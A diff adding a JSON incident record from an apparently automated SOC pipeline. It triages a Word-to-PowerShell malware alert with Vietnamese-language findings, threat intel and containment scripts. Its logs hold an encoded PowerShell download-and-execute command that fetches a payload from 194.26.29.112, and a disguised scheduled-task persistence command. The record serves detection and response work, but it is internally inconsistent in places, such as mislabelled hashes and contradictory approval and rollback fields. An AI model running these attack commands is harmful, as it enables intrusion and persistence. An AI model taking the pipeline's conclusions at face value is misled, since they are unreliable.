@@ -1,0 +1,1608 @@
+{
+  "incident_id": "INC-MALW-072438",
+  "status": "RESOLVED",
+  "created_at": "2026-10-22T07:24:38.009164Z",
+  "updated_at": "2026-10-22T07:25:35.593986Z",
+  "raw_logs": [
+    {
+      "log_source": "wazuh",
+      "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:12.000+0000\", \"rule\": {\"level\": 12, \"description\": \"Sysmon - Event 1: Suspicious Process creation by powershell.exe with encoded payload\", \"id\": \"92211\", \"mitre\": {\"id\": [\"T1059.001\", \"T1027\"], \"tactic\": [\"Execution\", \"Defense Evasion\"], \"technique\": [\"Command and Scripting Interpreter: PowerShell\", \"Obfuscated Files or Information\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_process_creation\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520612.2001\", \"full_log\": \"Sysmon Event 1: Process Creation: powershell.exe\", \"data\": {\"win\": {\"system\": {\"eventID\": \"1\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA\", \"parentImage\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\", \"parentCommandLine\": \"WINWORD.EXE\", \"hashes\": \"SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91\", \"user\": \"HCMUTE\\\\truongdo\", \"destinationIp\": \"194.26.29.112\", \"destinationPort\": \"443\", \"mordorProcessAccessEventId\": \"10\", \"mordorSourceProcess\": \"C:\\\\windows\\\\Explorer.EXE\", \"mordorTargetProcess\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+      "collected_at": "2026-10-22T07:24:38.009048Z"
+    },
+    {
+      "log_source": "wazuh",
+      "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:16.000+0000\", \"rule\": {\"level\": 9, \"description\": \"Sysmon - Event 11: File created in Temp directory by untrusted script\", \"id\": \"92215\", \"mitre\": {\"id\": [\"T1105\"], \"tactic\": [\"Command and Control\"], \"technique\": [\"Ingress Tool Transfer\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_file_create\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520616.2002\", \"full_log\": \"Sysmon Event 11: FileCreate: invoice_scan_v8.exe in Temp\", \"data\": {\"win\": {\"system\": {\"eventID\": \"11\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"targetFilename\": \"C:\\\\Users\\\\truongdo\\\\AppData\\\\Local\\\\Temp\\\\invoice_scan_v8.exe\", \"hashes\": \"SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91\", \"user\": \"HCMUTE\\\\truongdo\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+      "collected_at": "2026-10-22T07:24:38.009108Z"
+    },
+    {
+      "log_source": "wazuh",
+      "raw_payload": "{\"timestamp\": \"2026-10-15T09:30:22.000+0000\", \"rule\": {\"level\": 10, \"description\": \"Sysmon - Event 3: Suspicious network connection initiated by PowerShell to unknown public IP\", \"id\": \"92213\", \"mitre\": {\"id\": [\"T1071.001\"], \"tactic\": [\"Command and Control\"], \"technique\": [\"Application Layer Protocol: Web Protocols\"]}, \"groups\": [\"windows\", \"sysmon\", \"sysmon_network_connect\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520622.2003\", \"full_log\": \"Sysmon Event 3: Network connection detected to 194.26.29.112:443\", \"data\": {\"win\": {\"system\": {\"eventID\": \"3\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"sourceIp\": \"192.168.1.105\", \"sourcePort\": \"51234\", \"destinationIp\": \"194.26.29.112\", \"destinationPort\": \"443\", \"protocol\": \"tcp\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+      "collected_at": "2026-10-22T07:24:38.009131Z"
+    },
+    {
+      "log_source": "wazuh",
+      "raw_payload": "{\"timestamp\": \"2026-10-15T09:31:05.000+0000\", \"rule\": {\"level\": 8, \"description\": \"Sysmon - Event 1: Persistence established via schtasks.exe registration\", \"id\": \"92218\", \"mitre\": {\"id\": [\"T1053.005\"], \"tactic\": [\"Persistence\"], \"technique\": [\"Scheduled Task/Job: Scheduled Task\"]}, \"groups\": [\"windows\", \"sysmon\", \"persistence\"]}, \"agent\": {\"id\": \"002\", \"name\": \"WIN10-VICTIM-01\", \"ip\": \"192.168.1.105\"}, \"id\": \"1760520665.2004\", \"full_log\": \"Sysmon Event 1: Process Creation: schtasks.exe\", \"data\": {\"win\": {\"system\": {\"eventID\": \"1\", \"computer\": \"WIN10-VICTIM-01\"}, \"eventdata\": {\"image\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\", \"commandLine\": \"schtasks /create /tn \\\"WindowsTelemetryUpdate\\\" /tr \\\"C:\\\\Users\\\\truongdo\\\\AppData\\\\Local\\\\Temp\\\\invoice_scan_v8.exe\\\" /sc onlogon\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"user\": \"HCMUTE\\\\truongdo\", \"mordorTrace\": \"psh_powershell_httplistener\"}}}}",
+      "collected_at": "2026-10-22T07:24:38.009147Z"
+    }
+  ],
+  "parsed_events": [
+    {
+      "event_id": "Wazuh-1",
+      "timestamp": "2026-10-22T07:24:43.182579Z",
+      "source_type": "WazuhSIEM",
+      "host_name": "WIN10-VICTIM-01",
+      "user_name": "HCMUTE\\truongdo",
+      "process_name": "powershell.exe",
+      "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+      "parent_process": "WINWORD.EXE",
+      "parent_command_line": null,
+      "source_ip": "192.168.1.105",
+      "source_port": null,
+      "dest_ip": "194.26.29.112",
+      "dest_port": 443,
+      "file_hash": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+      "raw_attributes": {
+        "wazuh_alert_id": "1760520612.2001",
+        "wazuh_rule_id": "92211",
+        "wazuh_rule_level": 12,
+        "wazuh_rule_description": "Sysmon - Event 1: Suspicious Process creation by powershell.exe with encoded payload",
+        "wazuh_agent_id": "002",
+        "wazuh_agent_name": "WIN10-VICTIM-01",
+        "wazuh_groups": [
+          "windows",
+          "sysmon",
+          "sysmon_process_creation"
+        ],
+        "wazuh_mitre_ids": [
+          "T1059.001",
+          "T1027"
+        ],
+        "encoded_payload": "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+      }
+    },
+    {
+      "event_id": "Wazuh-11",
+      "timestamp": "2026-10-22T07:24:43.183307Z",
+      "source_type": "WazuhSIEM",
+      "host_name": "WIN10-VICTIM-01",
+      "user_name": "HCMUTE\\truongdo",
+      "process_name": "powershell.exe",
+      "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": null,
+      "parent_process": null,
+      "parent_command_line": null,
+      "source_ip": "192.168.1.105",
+      "source_port": null,
+      "dest_ip": null,
+      "dest_port": null,
+      "file_hash": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+      "raw_attributes": {
+        "wazuh_alert_id": "1760520616.2002",
+        "wazuh_rule_id": "92215",
+        "wazuh_rule_level": 9,
+        "wazuh_rule_description": "Sysmon - Event 11: File created in Temp directory by untrusted script",
+        "wazuh_agent_id": "002",
+        "wazuh_agent_name": "WIN10-VICTIM-01",
+        "wazuh_groups": [
+          "windows",
+          "sysmon",
+          "sysmon_file_create"
+        ],
+        "wazuh_mitre_ids": [
+          "T1105"
+        ]
+      }
+    },
+    {
+      "event_id": "Wazuh-3",
+      "timestamp": "2026-10-22T07:24:43.183383Z",
+      "source_type": "WazuhSIEM",
+      "host_name": "WIN10-VICTIM-01",
+      "user_name": null,
+      "process_name": "powershell.exe",
+      "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": null,
+      "parent_process": null,
+      "parent_command_line": null,
+      "source_ip": "192.168.1.105",
+      "source_port": null,
+      "dest_ip": "194.26.29.112",
+      "dest_port": 443,
+      "file_hash": null,
+      "raw_attributes": {
+        "wazuh_alert_id": "1760520622.2003",
+        "wazuh_rule_id": "92213",
+        "wazuh_rule_level": 10,
+        "wazuh_rule_description": "Sysmon - Event 3: Suspicious network connection initiated by PowerShell to unknown public IP",
+        "wazuh_agent_id": "002",
+        "wazuh_agent_name": "WIN10-VICTIM-01",
+        "wazuh_groups": [
+          "windows",
+          "sysmon",
+          "sysmon_network_connect"
+        ],
+        "wazuh_mitre_ids": [
+          "T1071.001"
+        ]
+      }
+    },
+    {
+      "event_id": "Wazuh-1",
+      "timestamp": "2026-10-22T07:24:43.183442Z",
+      "source_type": "WazuhSIEM",
+      "host_name": "WIN10-VICTIM-01",
+      "user_name": "HCMUTE\\truongdo",
+      "process_name": "schtasks.exe",
+      "process_path": "C:\\Windows\\System32\\schtasks.exe",
+      "command_line": "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon",
+      "parent_process": "powershell.exe",
+      "parent_command_line": null,
+      "source_ip": "192.168.1.105",
+      "source_port": null,
+      "dest_ip": null,
+      "dest_port": null,
+      "file_hash": null,
+      "raw_attributes": {
+        "wazuh_alert_id": "1760520665.2004",
+        "wazuh_rule_id": "92218",
+        "wazuh_rule_level": 8,
+        "wazuh_rule_description": "Sysmon - Event 1: Persistence established via schtasks.exe registration",
+        "wazuh_agent_id": "002",
+        "wazuh_agent_name": "WIN10-VICTIM-01",
+        "wazuh_groups": [
+          "windows",
+          "sysmon",
+          "persistence"
+        ],
+        "wazuh_mitre_ids": [
+          "T1053.005"
+        ]
+      }
+    }
+  ],
+  "triage_result": {
+    "is_incident": true,
+    "confidence_score": 0.85,
+    "severity": "CRITICAL",
+    "summary": "Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8) [Self-Correction: Tự động nâng cấp mức độ nguy hiểm từ MEDIUM lên CRITICAL do phát hiện IoC có điểm đe dọa CTI cao: 92/100]",
+    "rule_or_model": "Builtin-Heuristic-Engine",
+    "attack_category": null,
+    "attack_type": null,
+    "primary_mitre_tactics": []
+  },
+  "threat_intel": {
+    "extracted_iocs": [
+      {
+        "ioc_type": "IP",
+        "value": "194.26.29.112",
+        "reputation_score": 92,
+        "is_malicious": true,
+        "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+        "details": {
+          "reputation_score": 92,
+          "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+          "country": "RU",
+          "isp": "BadHost Ltd",
+          "categories": [
+            "C2",
+            "Botnet"
+          ]
+        },
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      }
+    ],
+    "indicators": [
+      {
+        "ioc_type": "IP",
+        "value": "194.26.29.112",
+        "reputation_score": 92,
+        "is_malicious": true,
+        "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+        "details": {
+          "reputation_score": 92,
+          "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+          "country": "RU",
+          "isp": "BadHost Ltd",
+          "categories": [
+            "C2",
+            "Botnet"
+          ]
+        },
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      }
+    ],
+    "related_threat_actors": [
+      "Cobalt Strike Team / RedLine Stealer"
+    ],
+    "mitre_techniques": [
+      "T1059.001"
+    ],
+    "enrichment_summary": "Đã phát hiện và làm giàu 3 IoCs, ánh xạ 3 kỹ thuật MITRE ATT&CK."
+  },
+  "rca_result": {
+    "initial_access_vector": "Spearphishing Email / Malicious Attachment",
+    "attack_timeline": [
+      "[07:24:43] powershell.exe thực thi: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -",
+      "[07:24:43] powershell.exe thực thi: ",
+      "[07:24:43] powershell.exe thực thi: ",
+      "[07:24:43] schtasks.exe thực thi: schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\"
+    ],
+    "process_tree": [
+      {
+        "process_id": "PID-1000",
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+        "parent_id": null,
+        "is_malicious_origin": true
+      },
+      {
+        "process_id": "PID-1001",
+        "process_name": "powershell.exe",
+        "command_line": "",
+        "parent_id": "PID-1000",
+        "is_malicious_origin": false
+      },
+      {
+        "process_id": "PID-1002",
+        "process_name": "powershell.exe",
+        "command_line": "",
+        "parent_id": "PID-1001",
+        "is_malicious_origin": false
+      },
+      {
+        "process_id": "PID-1003",
+        "process_name": "schtasks.exe",
+        "command_line": "schtasks /create /tn \"WindowsTelemetryUpdate\" /tr \"C:\\Users\\truongdo\\AppData\\Local\\Temp\\invoice_scan_v8.exe\" /sc onlogon",
+        "parent_id": "PID-1002",
+        "is_malicious_origin": false
+      }
+    ],
+    "high_fidelity_tree": [],
+    "mitre_tactics": [
+      "Initial Access",
+      "Execution",
+      "Defense Evasion"
+    ],
+    "root_cause_summary": "Tấn công khởi nguồn từ Spearphishing Email / Malicious Attachment, thực thi chuỗi tiến trình độc hại qua 4 bước.",
+    "confirmed_attack_type": null,
+    "attack_scope": null
+  },
+  "recommended_actions": [
+    {
+      "action_id": "ACT-MALW-ISOLATE",
+      "action_type": "ISOLATE_HOST",
+      "target": "WIN10-VICTIM-01",
+      "description": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ để ngăn chặn lây lan.",
+      "priority": 1,
+      "require_human_approval": true,
+      "is_approved": false,
+      "parameters": {
+        "rollback_executed": true,
+        "rollback_reason": "FALSE_POSITIVE",
+        "rollback_by": "soc_analyst_01",
+        "rollback_at": "2026-10-22T07:25:19.154006+00:00"
+      },
+      "phase": "CONTAINMENT",
+      "script_bundle": {
+        "bundle_id": "BUNDLE-7B191C56",
+        "action_id": "ACT-MALW-ISOLATE",
+        "phase": "CONTAINMENT",
+        "target": "WIN10-VICTIM-01",
+        "powershell_script": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; New-NetFirewallRule -DisplayName 'BlockAllExceptWazuh' -Direction Outbound -Action Block",
+        "bash_script": "iptables -A OUTPUT -p tcp ! --dport 1514 -j DROP; iptables -A INPUT -p tcp ! --sport 1514 -j DROP",
+        "wazuh_active_response": {
+          "command": "host-isolate",
+          "target": "WIN10-VICTIM-01"
+        },
+        "rollback_script": "Remove-NetFirewallRule -DisplayName 'BlockAllExceptWazuh'; Enable-NetAdapter -Name * -Confirm:$false",
+        "instructions": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ (giữ kết nối Wazuh Manager). Rollback: gỡ luật cách ly và mở lại card mạng.",
+        "created_at": "2026-10-22T07:24:43.184206Z"
+      }
+    },
+    {
+      "action_id": "ACT-MALW-KILL",
+      "action_type": "KILL_PROCESS",
+      "target": "schtasks.exe",
+      "description": "Tiêu diệt tiến trình độc hại schtasks.exe đang chạy trên máy trạm.",
+      "priority": 2,
+      "require_human_approval": false,
+      "is_approved": false,
+      "parameters": {},
+      "phase": "CONTAINMENT",
+      "script_bundle": {
+        "bundle_id": "BUNDLE-BDB2A96E",
+        "action_id": "ACT-MALW-KILL",
+        "phase": "CONTAINMENT",
+        "target": "schtasks.exe",
+        "powershell_script": "Stop-Process -Name 'schtasks.exe' -Force -ErrorAction SilentlyContinue",
+        "bash_script": "pkill -9 -f 'schtasks.exe'",
+        "wazuh_active_response": {
+          "command": "kill-process",
+          "target": "schtasks.exe"
+        },
+        "rollback_script": null,
+        "instructions": "Tiêu diệt tiến trình độc hại schtasks.exe. Lưu ý: Hành động này không thể hoàn tác tự động (Irreversible).",
+        "created_at": "2026-10-22T07:24:43.184246Z"
+      }
+    },
+    {
+      "action_id": "ACT-MALW-BLOCK",
+      "action_type": "BLOCK_IP",
+      "target": "194.26.29.112",
+      "description": "Chặn địa chỉ IP C2 194.26.29.112 trên Firewall và Web Proxy.",
+      "priority": 1,
+      "require_human_approval": true,
+      "is_approved": false,
+      "parameters": {
+        "rollback_executed": true,
+        "rollback_reason": "FALSE_POSITIVE",
+        "rollback_by": "soc_analyst_01",
+        "rollback_at": "2026-10-22T07:25:19.154025+00:00"
+      },
+      "phase": "CONTAINMENT",
+      "script_bundle": {
+        "bundle_id": "BUNDLE-14C949F6",
+        "action_id": "ACT-MALW-BLOCK",
+        "phase": "CONTAINMENT",
+        "target": "194.26.29.112",
+        "powershell_script": "New-NetFirewallRule -DisplayName 'Block_194.26.29.112' -Direction Inbound -Action Block -RemoteAddress 194.26.29.112",
+        "bash_script": "iptables -I INPUT -s 194.26.29.112 -j DROP; iptables -I FORWARD -s 194.26.29.112 -j DROP",
+        "wazuh_active_response": {
+          "command": "firewall-drop",
+          "target": "194.26.29.112"
+        },
+        "rollback_script": "Remove-NetFirewallRule -DisplayName 'Block_194.26.29.112'",
+        "instructions": "Chặn địa chỉ IP độc hại 194.26.29.112 trên Firewall. Rollback: xóa luật chặn iptables/Windows Firewall.",
+        "created_at": "2026-10-22T07:24:43.184271Z"
+      }
+    }
+  ],
+  "final_report": {
+    "report_id": "REP-INC-MALW-072438",
+    "incident_title": "Báo cáo Điều tra Sự cố [CRITICAL]: Endpoint Malware & C2 Reverse Shell - INC-MALW-072438",
+    "created_at": "2026-10-22T07:25:35.593951Z",
+    "executive_summary": "Sự cố INC-MALW-072438 được phát hiện và xử lý tự động bởi hệ thống SOC Multi-Agent. Đánh giá rủi ro: CRITICAL. Định danh loại tấn công: Endpoint Malware & C2 Reverse Shell. Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8) [Self-Correction: Tự động nâng cấp mức độ nguy hiểm từ MEDIUM lên CRITICAL do phát hiện IoC có điểm đe dọa CTI cao: 92/100] Đã kích hoạt 3 biện pháp ngăn chặn kịp thời.",
+    "detailed_findings": "1. Tổng số sự kiện phân tích: 4\n2. Nguồn xâm nhập ban đầu: Spearphishing Email / Malicious Attachment\n3. Tóm lược phân tích nguyên nhân: Tấn công khởi nguồn từ Spearphishing Email / Malicious Attachment, thực thi chuỗi tiến trình độc hại qua 4 bước.",
+    "mitre_attack_matrix_mapping": [
+      "T1059.001"
+    ],
+    "ioc_table": [
+      {
+        "ioc_type": "IP",
+        "value": "194.26.29.112",
+        "reputation_score": 92,
+        "is_malicious": true,
+        "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+        "details": {
+          "reputation_score": 92,
+          "threat_actor": "Cobalt Strike Team / RedLine Stealer",
+          "country": "RU",
+          "isp": "BadHost Ltd",
+          "categories": [
+            "C2",
+            "Botnet"
+          ]
+        },
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      },
+      {
+        "ioc_type": "MD5",
+        "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+        "reputation_score": 85,
+        "is_malicious": true,
+        "threat_actor": "Known Malware Sample",
+        "details": {},
+        "cti_score": null,
+        "first_seen": null,
+        "last_seen": null,
+        "mitre_tactics": [],
+        "is_public": null,
+        "context_source": null
+      }
+    ],
+    "action_plan": [
+      {
+        "action_id": "ACT-MALW-ISOLATE",
+        "action_type": "ISOLATE_HOST",
+        "target": "WIN10-VICTIM-01",
+        "description": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ để ngăn chặn lây lan.",
+        "priority": 1,
+        "require_human_approval": true,
+        "is_approved": false,
+        "parameters": {
+          "rollback_executed": true,
+          "rollback_reason": "FALSE_POSITIVE",
+          "rollback_by": "soc_analyst_01",
+          "rollback_at": "2026-10-22T07:25:19.154006+00:00"
+        },
+        "phase": "CONTAINMENT",
+        "script_bundle": {
+          "bundle_id": "BUNDLE-7B191C56",
+          "action_id": "ACT-MALW-ISOLATE",
+          "phase": "CONTAINMENT",
+          "target": "WIN10-VICTIM-01",
+          "powershell_script": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; New-NetFirewallRule -DisplayName 'BlockAllExceptWazuh' -Direction Outbound -Action Block",
+          "bash_script": "iptables -A OUTPUT -p tcp ! --dport 1514 -j DROP; iptables -A INPUT -p tcp ! --sport 1514 -j DROP",
+          "wazuh_active_response": {
+            "command": "host-isolate",
+            "target": "WIN10-VICTIM-01"
+          },
+          "rollback_script": "Remove-NetFirewallRule -DisplayName 'BlockAllExceptWazuh'; Enable-NetAdapter -Name * -Confirm:$false",
+          "instructions": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ (giữ kết nối Wazuh Manager). Rollback: gỡ luật cách ly và mở lại card mạng.",
+          "created_at": "2026-10-22T07:24:43.184206Z"
+        }
+      },
+      {
+        "action_id": "ACT-MALW-KILL",
+        "action_type": "KILL_PROCESS",
+        "target": "schtasks.exe",
+        "description": "Tiêu diệt tiến trình độc hại schtasks.exe đang chạy trên máy trạm.",
+        "priority": 2,
+        "require_human_approval": false,
+        "is_approved": false,
+        "parameters": {},
+        "phase": "CONTAINMENT",
+        "script_bundle": {
+          "bundle_id": "BUNDLE-BDB2A96E",
+          "action_id": "ACT-MALW-KILL",
+          "phase": "CONTAINMENT",
+          "target": "schtasks.exe",
+          "powershell_script": "Stop-Process -Name 'schtasks.exe' -Force -ErrorAction SilentlyContinue",
+          "bash_script": "pkill -9 -f 'schtasks.exe'",
+          "wazuh_active_response": {
+            "command": "kill-process",
+            "target": "schtasks.exe"
+          },
+          "rollback_script": null,
+          "instructions": "Tiêu diệt tiến trình độc hại schtasks.exe. Lưu ý: Hành động này không thể hoàn tác tự động (Irreversible).",
+          "created_at": "2026-10-22T07:24:43.184246Z"
+        }
+      },
+      {
+        "action_id": "ACT-MALW-BLOCK",
+        "action_type": "BLOCK_IP",
+        "target": "194.26.29.112",
+        "description": "Chặn địa chỉ IP C2 194.26.29.112 trên Firewall và Web Proxy.",
+        "priority": 1,
+        "require_human_approval": true,
+        "is_approved": false,
+        "parameters": {
+          "rollback_executed": true,
+          "rollback_reason": "FALSE_POSITIVE",
+          "rollback_by": "soc_analyst_01",
+          "rollback_at": "2026-10-22T07:25:19.154025+00:00"
+        },
+        "phase": "CONTAINMENT",
+        "script_bundle": {
+          "bundle_id": "BUNDLE-14C949F6",
+          "action_id": "ACT-MALW-BLOCK",
+          "phase": "CONTAINMENT",
+          "target": "194.26.29.112",
+          "powershell_script": "New-NetFirewallRule -DisplayName 'Block_194.26.29.112' -Direction Inbound -Action Block -RemoteAddress 194.26.29.112",
+          "bash_script": "iptables -I INPUT -s 194.26.29.112 -j DROP; iptables -I FORWARD -s 194.26.29.112 -j DROP",
+          "wazuh_active_response": {
+            "command": "firewall-drop",
+            "target": "194.26.29.112"
+          },
+          "rollback_script": "Remove-NetFirewallRule -DisplayName 'Block_194.26.29.112'",
+          "instructions": "Chặn địa chỉ IP độc hại 194.26.29.112 trên Firewall. Rollback: xóa luật chặn iptables/Windows Firewall.",
+          "created_at": "2026-10-22T07:24:43.184271Z"
+        }
+      }
+    ],
+    "attack_type": "Endpoint Malware & C2 Reverse Shell",
+    "attack_category": "MALWARE",
+    "confidence_level": 0.85
+  },
+  "attack_type": "Endpoint Malware & C2 Reverse Shell",
+  "analyst_approved": false,
+  "analyst_feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+  "next_node": "__end__",
+  "error_message": null,
+  "reanalysis_count": 0,
+  "max_reanalysis": 2,
+  "reanalysis_reason": null,
+  "history": [
+    {
+      "timestamp": "2026-10-22T07:24:43.183515Z",
+      "node": "ingestion",
+      "from_status": "NEW",
+      "to_status": "NEW",
+      "message": "Bóc tách thành công 4 sự kiện ParsedEvent từ 4 raw logs",
+      "metadata": {
+        "parsed_count": 4,
+        "raw_count": 4
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.183653Z",
+      "node": "triage",
+      "from_status": "NEW",
+      "to_status": "INVESTIGATING",
+      "message": "Xác nhận sự cố thực sự (True Positive) - MEDIUM: Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8)",
+      "metadata": {
+        "is_incident": true,
+        "confidence_score": 0.85,
+        "severity": "MEDIUM",
+        "rule_or_model": "Builtin-Heuristic-Engine"
+      }
+    },
+    {
+      "timestamp": "2026-10-22T07:24:43.183981Z",
+      "node": "enrichment",
+      "from_status": "INVESTIGATING",
+      "to_status": "INVESTIGATING",
+      "message": "Tự động hiệu chỉnh sai lệch: Nâng cấp severity từ MEDIUM lên CRITICAL dựa trên CTI (Threat Score: 92)",
